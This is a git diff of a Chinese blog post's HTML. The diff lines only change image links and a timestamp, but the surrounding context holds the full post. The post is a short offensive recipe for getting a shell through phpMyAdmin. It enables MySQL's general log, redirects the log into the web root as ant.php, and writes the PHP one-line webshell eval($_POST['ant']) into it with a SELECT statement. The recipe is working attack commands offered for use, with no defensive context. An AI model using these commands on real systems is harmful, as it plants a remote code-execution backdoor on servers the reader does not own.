@@ -23,16 +23,16 @@
 <meta property="og:site_name" content="Ninja&#39;s blog">
 <meta property="og:description" content="0x01 序可以利用phpMyAdmin报错日志的功能进行getshell。 0x02 利用报错日志getshell123456789#查看日子记录状态show variables like &quot;general_log%&quot;#开启日志设置为onset global general_log&#x3D;&#x27;on&#x27;#设置日志保存路径set global  general_log_">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/%E5%9B%BE%E7%89%87-1-1024x509.png">
-<meta property="og:image" content="http://example.com/images/%E5%9B%BE%E7%89%87-3-1024x236.png">
-<meta property="og:image" content="http://example.com/images/%E5%9B%BE%E7%89%87-2-1024x520.png">
-<meta property="og:image" content="http://example.com/images/%E5%9B%BE%E7%89%87-4-1024x641.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-1-1024x509.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-3-1024x236.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-2-1024x520.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-4-1024x641.png">
 <meta property="article:published_time" content="2020-09-10T04:31:25.000Z">
-<meta property="article:modified_time" content="2024-07-01T06:35:38.218Z">
+<meta property="article:modified_time" content="2024-07-01T08:43:37.066Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="getshell">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/%E5%9B%BE%E7%89%87-1-1024x509.png">
+<meta name="twitter:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-1-1024x509.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -303,10 +303,10 @@
                 <h4 id="0x01-序"><a href="#0x01-序" class="headerlink" title="0x01 序"></a>0x01 序</h4><p>可以利用phpMyAdmin报错日志的功能进行getshell。</p>
 <h4 id="0x02-利用报错日志getshell"><a href="#0x02-利用报错日志getshell" class="headerlink" title="0x02 利用报错日志getshell"></a>0x02 利用报错日志getshell</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#查看日子记录状态</span><br>show variables like <span class="hljs-string">&quot;general_log%&quot;</span><br><span class="hljs-comment">#开启日志设置为on</span><br><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log</span>=<span class="hljs-string">&#x27;on&#x27;</span><br><span class="hljs-comment">#设置日志保存路径</span><br><span class="hljs-built_in">set</span> global  general_log_file =<span class="hljs-string">&quot;D:\\phpStudy\\PHPTutorial\\WWW\\ant.php&quot;</span><br><span class="hljs-comment">#写入一句话木马到日志文件</span><br>select <span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-variable">$_POST</span>[&#x27;ant&#x27;]);?&gt;&quot;</span><br><span class="hljs-comment">#访问/ant.php拿到shell</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/%E5%9B%BE%E7%89%87-1-1024x509.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/./images/%E5%9B%BE%E7%89%87-3-1024x236.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/./images/%E5%9B%BE%E7%89%87-2-1024x520.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/./images/%E5%9B%BE%E7%89%87-4-1024x641.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-1-1024x509.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-3-1024x236.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-2-1024x520.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/%E5%9B%BE%E7%89%87-4-1024x641.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 
                 
               </div>
